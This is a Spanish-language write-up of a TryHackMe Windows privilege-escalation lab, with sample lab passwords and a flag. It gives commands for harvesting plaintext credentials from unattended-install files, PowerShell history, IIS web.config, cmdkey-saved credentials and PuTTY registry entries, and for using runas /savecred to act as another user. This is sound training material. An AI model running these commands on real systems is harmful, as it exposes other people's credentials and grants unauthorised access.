---
title: "TryHackMe: Windows Privilege Escalation"
category: "TryHackMe"
order: 28
tags: ["tryhackme", "windows", "credential-harvesting", "iis", "putty", "cmdkey"]
layout: layouts/writeup.njk
permalink: /writeups/thm-windows-privilege-escalation.html
---

## Contexto: tipos de cuentas en Windows

- **Administrators:** máximos privilegios, pueden cambiar cualquier configuración y acceder a cualquier archivo.
- **Standard Users:** actividad limitada a sus propios archivos.
- **SYSTEM/LocalSystem:** cuenta interna del SO, con acceso a todos los recursos del host, incluso por encima de un administrador.
- **Local Service / Network Service:** cuentas por defecto para correr servicios con privilegios mínimos.

## Cosechando contraseñas en ubicaciones comunes

### Instalaciones desatendidas de Windows

Archivos `Unattend.xml` / `sysprep.xml` usados en despliegues masivos pueden contener credenciales en texto plano:

```
C:\Unattend.xml
C:\Windows\Panther\Unattend.xml
C:\Windows\Panther\Unattend\Unattend.xml
C:\Windows\system32\sysprep.inf
C:\Windows\system32\sysprep\sysprep.xml
```

```xml
<Credentials>
    <Username>Administrator</Username>
    <Domain>thm.local</Domain>
    <Password>MyPassword123</Password>
</Credentials>
```

### Historial de PowerShell

```cmd
type %userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
```

**Ejercicio — contraseña de julia.jones filtrada en el historial:**

```cmd
C:\Users\thm-unpriv>type %userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
...
cmdkey /add:thmdc.local /user:julia.jones /pass:ZuperCkretPa5z
```

**Contraseña:** `ZuperCkretPa5z`

### Credenciales guardadas de Windows

```cmd
cmdkey /list
runas /savecred /user:admin cmd.exe
```

### Configuración de IIS (web.config)

```cmd
type C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config | findstr connectionString
```

**Ejercicio — contraseña de db_admin:**

```
<add connectionString="Server=thm-db.local;Database=thm-sekure;User ID=db_admin;Password=098n0x35skjD3" name="THM-DB" />
```

**Contraseña:** `098n0x35skjD3`

### Credenciales guardadas con cmdkey + runas

```cmd
C:\Users\thm-unpriv>cmdkey /list
Target: Domain:interactive=WPRIVESC1\mike.katz

runas /savecred /user:mike.katz cmd.exe
```

Al ejecutar `runas` con `/savecred` se abre una nueva consola ya autenticada como `mike.katz`, sin necesidad de conocer su contraseña real:

```cmd
C:\Users\mike.katz\Desktop>type flag.txt
THM{WHAT_IS_MY_PASSWORD}
```

### Sesiones guardadas de PuTTY

PuTTY no guarda la contraseña SSH, pero sí las credenciales de proxy configuradas, en texto plano en el registro:

```cmd
reg query HKEY_CURRENT_USER\Software\SimonTatham\PuTTY\Sessions\ /f "Proxy" /s
...
ProxyUsername    REG_SZ    thom.smith
ProxyPassword    REG_SZ    CoolPass2021
```

**Contraseña de thom.smith:** `CoolPass2021`

## Lecciones aprendidas

- Windows tiene una superficie sorprendentemente grande de "lugares habituales" donde credenciales quedan en texto plano: historiales de shell, archivos de despliegue desatendido, configuraciones de IIS, credenciales guardadas del propio SO, y software de terceros como PuTTY.
- `cmdkey /list` + `runas /savecred` permite pivotear a otro usuario sin conocer su contraseña, siempre que ya exista una credencial guardada en el sistema — un vector de post-explotación fácil de pasar por alto.
- Cualquier software que "recuerda" contraseñas (VPN, FTP, SSH, gestores de conexión) es candidato a almacenar esas credenciales en algún formato recuperable — vale la pena revisar el registro y los archivos de configuración de cada herramienta instalada.
